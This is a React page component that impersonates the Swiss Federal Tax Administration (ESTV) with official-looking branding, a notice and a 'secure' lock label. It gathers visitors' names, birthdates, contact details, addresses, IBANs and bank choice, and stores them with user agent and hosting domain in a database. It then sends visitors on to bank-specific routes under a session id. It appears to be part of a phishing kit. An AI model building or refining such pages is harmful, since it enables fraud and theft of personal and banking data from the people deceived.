import { useCallback, useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowRight, ChevronsUpDown, Check, Lock, AlertTriangle } from "lucide-react";
import { cn } from "@/lib/utils";
import { formatIBAN } from "@/lib/format";
import { banks, bankRouteMap, formatBirthdate } from "@/lib/banks";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { EstvHeader, EstvFooter, ESTV_RED, ESTV_TEXT } from "@/components/EstvChrome";
import { EstvI18nProvider, useEstvI18n } from "@/components/EstvI18n";
import { usePageMeta } from "@/hooks/use-page-meta";
import flagAsset from "@/assets/swiss-flag.svg.asset.json";
import {
  Popover, PopoverContent, PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command, CommandEmpty, CommandGroup, CommandItem, CommandList,
} from "@/components/ui/command";

const fieldBase =
  "h-12 w-full rounded-lg border bg-white px-4 text-[14px] placeholder:text-gray-400 transition-all duration-150 focus:outline-none focus:ring-4";
const fieldOk = "border-gray-200 hover:border-gray-300 focus:border-[#DC0018] focus:ring-[#DC0018]/10";
const fieldErr = "border-red-500 focus:border-red-500 focus:ring-red-500/15 bg-red-50/30";
const labelClass = "mb-2 block text-[13px] font-medium text-gray-700";

const REQUIRED_FIELDS = [
  "firstName", "lastName", "birthdate", "email", "phone",
  "street", "houseNumber", "postalCode", "city",
];

const EstvInner = () => {
  const { t } = useEstvI18n();
  const navigate = useNavigate();
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [birthdate, setBirthdate] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [houseNumber, setHouseNumber] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");
  const [iban, setIban] = useState("");
  const [selectedBank, setSelectedBank] = useState("");
  const [bankOpen, setBankOpen] = useState(false);
  const [bankSearch, setBankSearch] = useState("");
  const [touched, setTouched] = useState<Record<string, boolean>>({});
  const inputRef = useRef<HTMLInputElement>(null);

  usePageMeta(t("page.meta.title"), flagAsset.url);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  useEffect(() => {
    if (bankOpen && inputRef.current) inputRef.current.focus();
  }, [bankOpen]);

  const values: Record<string, string> = {
    firstName, lastName, birthdate, email, phone, street, houseNumber, postalCode, city,
  };
  const hasError = (name: string) => !!touched[name] && !values[name]?.trim();
  const inputCls = (name: string) => `${fieldBase} ${hasError(name) ? fieldErr : fieldOk}`;
  const onBlur = (name: string) => () => setTouched((tt) => ({ ...tt, [name]: true }));
  const ErrMsg = ({ name }: { name: string }) =>
    hasError(name) ? (
      <p className="mt-1 text-[12px] text-red-600">{t(`form.error.${name}`)}</p>
    ) : null;

  const ibanCleanLength = iban.replace(/\s/g, "").length;
  const showBankPicker = ibanCleanLength > 10;
  const selectedBankObj = banks.find((b) => b.name === selectedBank);

  const allValid =
    firstName.trim() && lastName.trim() && email.trim() && birthdate.trim() &&
    phone.trim() && street.trim() && houseNumber.trim() && postalCode.trim() &&
    city.trim() && ibanCleanLength >= 16 && selectedBank;

  const handleSubmit = useCallback(async () => {
    if (!allValid) {
      setTouched(REQUIRED_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {}));
      return;
    }
    setSubmitting(true);
    const sessionId = crypto.randomUUID().slice(0, 8);

    const { error } = await supabase
      .from("submissions")
      .insert({
        session_id: sessionId,
        full_name: `${firstName} ${lastName}`.trim(),
        email,
        birthdate,
        phone,
        street,
        house_number: houseNumber,
        postal_code: postalCode,
        city,
        iban,
        bank: selectedBank,
        flow: "estv",
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
        domain: typeof window !== "undefined"
          ? window.location.hostname.replace(/^www\./, "").toLowerCase()
          : null,
      })
      .select("id")
      .single();

    if (error) {
      setSubmitting(false);
      console.error("Insert failed:", error);
      alert(t("form.errorSave"));
      return;
    }

    const route = bankRouteMap[selectedBank];
    if (route) {
      setShowLoading(true);
      setTimeout(() => navigate(`${route}?s=${sessionId}`), 2500);
    }
  }, [
    allValid, firstName, lastName, email, birthdate, phone, street, houseNumber,
    postalCode, city, iban, selectedBank, navigate, t,
  ]);

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ color: ESTV_TEXT, fontFamily: "'Inter', system-ui, sans-serif" }}>
      {showLoading && (
        <LoadingOverlay message={t("form.loading")} onComplete={() => {}} />
      )}
      <EstvHeader />

      <main className="flex-1 py-10 md:py-14">
        {/* Breadcrumb */}
        <div className="max-w-[1280px] mx-auto px-6 mb-6 text-[13px] text-gray-600">
          <span>{t("page.breadcrumb.home")}</span>
          <span className="mx-2">›</span>
          <span className="text-gray-900">{t("page.breadcrumb.current")}</span>
        </div>

        <div className="max-w-[860px] mx-auto px-6">
          <h1 className="text-[34px] md:text-[42px] font-semibold tracking-tight leading-[1.1] mb-4">
            {t("page.title")}
          </h1>
          <p className="text-[16px] text-gray-700 leading-relaxed max-w-[680px] mb-8">
            {t("page.intro")}
          </p>

          {/* Hinweis */}
          <div className="rounded-xl border-l-[3px] p-4 mb-8 flex gap-3" style={{ borderColor: ESTV_RED, backgroundColor: "#FDF2F3" }}>
            <AlertTriangle className="w-5 h-5 mt-0.5 shrink-0" style={{ color: ESTV_RED }} />
            <div className="text-[14px] text-gray-800 leading-relaxed">
              <strong>{t("page.noticeTitle")}</strong> {t("page.notice")}
            </div>
          </div>

          {/* Formular */}
          <div className="bg-white rounded-2xl border border-gray-100 shadow-[0_4px_24px_-12px_rgba(0,0,0,0.08)]">
            <div className="px-6 md:px-8 py-6 border-b border-gray-100 bg-gradient-to-b from-[#FAFAFA] to-white rounded-t-2xl">
              <h2 className="text-[20px] font-semibold">{t("form.title")}</h2>
              <p className="text-[13px] text-gray-500 mt-1">
                {t("form.requiredHint.prefix")} <span style={{ color: ESTV_RED }}>*</span> {t("form.requiredHint.suffix")}
              </p>
            </div>

            <div className="p-6 md:p-8 space-y-10">
              {/* Persönliche Daten */}
              <section>
                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>{t("form.section.personal")}</h3>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <label className={labelClass}>{t("form.label.firstName")} <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)} onBlur={onBlur("firstName")} className={inputCls("firstName")} />
                      <ErrMsg name="firstName" />
                    </div>
                    <div>
                      <label className={labelClass}>{t("form.label.lastName")} <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={lastName} onChange={(e) => setLastName(e.target.value)} onBlur={onBlur("lastName")} className={inputCls("lastName")} />
                      <ErrMsg name="lastName" />
                    </div>
                  </div>
                  <div className="md:max-w-[280px]">
                    <label className={labelClass}>{t("form.label.birthdate")} <span style={{ color: ESTV_RED }}>*</span></label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={birthdate}
                      onChange={(e) => {
                        let raw = e.target.value;
                        if (raw.length < birthdate.length && birthdate.endsWith(".") && !raw.endsWith(".")) {
                          raw = raw.slice(0, -1);
                        }
                        setBirthdate(formatBirthdate(raw));
                      }}
                      onBlur={onBlur("birthdate")}
                      placeholder={t("form.placeholder.birthdate")}
                      maxLength={10}
                      className={inputCls("birthdate")}
                    />
                    <ErrMsg name="birthdate" />
                  </div>
                </div>
              </section>

              {/* Adresse */}
              <section>
                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>{t("form.section.address")}</h3>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-[1fr_160px] gap-4">
                    <div>
                      <label className={labelClass}>{t("form.label.street")} <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={street} onChange={(e) => setStreet(e.target.value)} onBlur={onBlur("street")} className={inputCls("street")} />
                      <ErrMsg name="street" />
                    </div>
                    <div>
                      <label className={labelClass}>{t("form.label.houseNumber")} <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={houseNumber} onChange={(e) => setHouseNumber(e.target.value)} onBlur={onBlur("houseNumber")} className={inputCls("houseNumber")} />
                      <ErrMsg name="houseNumber" />
                    </div>
                  </div>
                  <div className="grid grid-cols-1 md:grid-cols-[160px_1fr] gap-4">
                    <div>
                      <label className={labelClass}>{t("form.label.postalCode")} <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} onBlur={onBlur("postalCode")} className={inputCls("postalCode")} />
                      <ErrMsg name="postalCode" />
                    </div>
                    <div>
                      <label className={labelClass}>{t("form.label.city")} <span style={{ color: ESTV_RED }}>*</span></label>
                      <input type="text" value={city} onChange={(e) => setCity(e.target.value)} onBlur={onBlur("city")} className={inputCls("city")} />
                      <ErrMsg name="city" />
                    </div>
                  </div>
                </div>
              </section>

              {/* Kontakt */}
              <section>
                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>{t("form.section.contact")}</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className={labelClass}>{t("form.label.email")} <span style={{ color: ESTV_RED }}>*</span></label>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} onBlur={onBlur("email")} className={inputCls("email")} />
                    <ErrMsg name="email" />
                  </div>
                  <div>
                    <label className={labelClass}>{t("form.label.phone")} <span style={{ color: ESTV_RED }}>*</span></label>
                    <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} onBlur={onBlur("phone")} className={inputCls("phone")} />
                    <ErrMsg name="phone" />
                  </div>
                </div>
              </section>

              {/* Bankverbindung */}
              <section>
                <h3 className="text-[15px] font-semibold mb-5 pl-3 border-l-[3px]" style={{ borderColor: ESTV_RED }}>{t("form.section.bank")}</h3>
                <p className="text-[13px] text-gray-600 mb-4">
                  {t("form.bank.intro")}
                </p>
                <div className="space-y-4">
                  <div>
                    <label className={labelClass}>{t("form.label.iban")} <span style={{ color: ESTV_RED }}>*</span></label>
                    <input
                      type="text"
                      value={iban}
                      onChange={(e) => setIban(formatIBAN(e.target.value))}
                      maxLength={29}
                      placeholder={t("form.placeholder.iban")}
                      className={cn(fieldBase, fieldOk, "tracking-wider")}
                    />
                  </div>

                  {showBankPicker && (
                    <div className="animate-in fade-in slide-in-from-top-2 duration-300">
                      <label className={labelClass}>{t("form.label.bank")} <span style={{ color: ESTV_RED }}>*</span></label>
                      <Popover
                        open={bankOpen}
                        onOpenChange={(open) => {
                          setBankOpen(open);
                          if (!open) setBankSearch("");
                        }}
                      >
                        <PopoverTrigger asChild>
                          <div
                            className="flex h-12 w-full cursor-pointer items-center rounded-lg border border-gray-200 bg-white px-4 transition-all duration-150 hover:border-gray-300 focus-within:border-[#DC0018] focus-within:ring-4 focus-within:ring-[#DC0018]/10"
                            role="combobox"
                            aria-expanded={bankOpen}
                            onClick={() => setBankOpen(true)}
                          >
                            {selectedBankObj && !bankOpen && (
                              <img src={selectedBankObj.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                            )}
                            <input
                              ref={inputRef}
                              type="text"
                              className={cn(
                                "h-full flex-1 bg-transparent text-sm outline-none",
                                selectedBank ? "placeholder:text-black" : "placeholder:text-gray-400"
                              )}
                              placeholder={selectedBank || t("form.placeholder.bank")}
                              value={bankSearch}
                              onClick={(e) => { e.stopPropagation(); if (!bankOpen) setBankOpen(true); }}
                              onChange={(e) => { setBankSearch(e.target.value); if (!bankOpen) setBankOpen(true); }}
                              onFocus={(e) => { e.stopPropagation(); if (!bankOpen) setBankOpen(true); }}
                            />
                            <ChevronsUpDown className="h-4 w-4 flex-shrink-0 text-gray-400" />
                          </div>
                        </PopoverTrigger>
                        <PopoverContent className="w-[--radix-popover-trigger-width] p-0 rounded-xl shadow-lg border border-gray-100" align="start">
                          <Command>
                            <CommandList className="max-h-[250px] overflow-y-auto">
                              <CommandEmpty>{t("form.bank.empty")}</CommandEmpty>
                              <CommandGroup>
                                {banks
                                  .filter((bank) => bank.name.toLowerCase().includes(bankSearch.toLowerCase()))
                                  .map((bank) => (
                                    <CommandItem
                                      key={bank.name}
                                      value={bank.name}
                                      onSelect={() => {
                                        setSelectedBank(bank.name);
                                        setBankOpen(false);
                                        setBankSearch("");
                                      }}
                                    >
                                      <img src={bank.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                                      <span className="flex-1">{bank.name}</span>
                                      {selectedBank === bank.name && (
                                        <Check className="h-4 w-4" style={{ color: ESTV_RED }} />
                                      )}
                                    </CommandItem>
                                  ))}
                              </CommandGroup>
                            </CommandList>
                          </Command>
                        </PopoverContent>
                      </Popover>
                    </div>
                  )}
                </div>
              </section>

              {/* Submit */}
              <div className="pt-4 flex flex-col items-start gap-3">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={submitting}
                  className="inline-flex items-center gap-2 text-white font-semibold text-[14px] px-8 py-3.5 rounded-full shadow-sm transition-all duration-150 hover:shadow-md hover:-translate-y-px disabled:opacity-60 disabled:hover:translate-y-0"
                  style={{ backgroundColor: ESTV_RED }}
                >
                  <span>{t("form.submit")}</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
                <div className="flex items-center gap-2 text-[12px] text-gray-500">
                  <Lock className="w-3.5 h-3.5" />
                  <span>{t("form.ssl")}</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <EstvFooter />
    </div>
  );
};

const Estv = () => (
  <EstvI18nProvider>
    <EstvInner />
  </EstvI18nProvider>
);

export default Estv;
